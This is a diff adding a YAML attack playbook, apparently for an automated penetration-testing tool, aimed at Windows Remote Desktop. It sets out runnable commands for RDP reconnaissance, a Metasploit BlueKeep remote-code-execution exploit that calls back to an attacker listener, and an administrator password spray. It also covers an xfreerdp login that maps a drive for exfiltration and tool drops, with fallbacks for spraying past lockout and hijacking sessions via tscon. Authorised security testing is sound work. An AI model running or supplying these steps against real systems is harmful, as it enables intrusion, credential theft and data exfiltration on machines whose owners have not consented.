@@ -1,0 +1,40 @@
+id: service_rdp_bluekeep
+title: "RDP — BlueKeep / DejaBlue + cred attack + screen hijack"
+phase: exploit
+mitre: ["T1021.001", "T1110.001", "T1210"]
+trigger:
+  services: ["rdp", "ms-wbt-server", "terminal-services"]
+  ports:    [3389, 13389]
+  os_any:   ["windows"]
+  cves:     ["CVE-2019-0708", "CVE-2019-1181", "CVE-2019-1182", "CVE-2019-1222", "CVE-2019-1226"]
+keywords: ["rdp", "bluekeep", "dejablue", "remote desktop", "ncrack rdp", "xfreerdp"]
+preconditions:
+  - "TCP/3389 reachable"
+  - "Confirmed Windows host"
+steps:
+  - tool: nmap
+    cmd:  "nmap -sV -p3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info {target}"
+    why:  "Encryption posture + MS12-020 + NTLM-leaked AD info (domain, hostname, OS build)"
+  - tool: rdp-sec-check
+    cmd:  "rdp-sec-check.pl {target}"
+    why:  "NLA / CredSSP / encryption level — flags pre-NLA hosts vulnerable to BlueKeep"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS {target}; run'"
+    why:  "Detect BlueKeep without exploiting (safe scanner)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; set RPORT 3389; set TARGET 3; set LHOST {LHOST}; set LPORT {LPORT}; check; exploit'"
+    why:  "BlueKeep RCE — Windows 7/Server 2008 R2 unpatched. ALWAYS run check first; exploit can BSOD."
+  - tool: ncrack
+    cmd:  "ncrack -vv --user administrator -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt rdp://{target}"
+    why:  "Cred spray — slower than hydra but more reliable on RDP"
+  - tool: xfreerdp
+    cmd:  "xfreerdp /v:{target} /u:{user} /p:'{password}' /cert:ignore /dynamic-resolution +clipboard /drive:share,/tmp"
+    why:  "Foothold once cred valid; +clipboard + /drive lets you exfil + drop tools"
+expected_outcome: "Remote desktop session as user; SYSTEM via BlueKeep on Win 7/2008 R2"
+fallbacks:
+  - "If NLA enabled → cred required; pivot via SMB cred → RDP same cred"
+  - "If account-lockout → pixie-RDP password spray (Patator with pause)"
+  - "Post-foothold: rdesktop session hijack from existing user (tscon as SYSTEM)"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2019-0708"
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp"
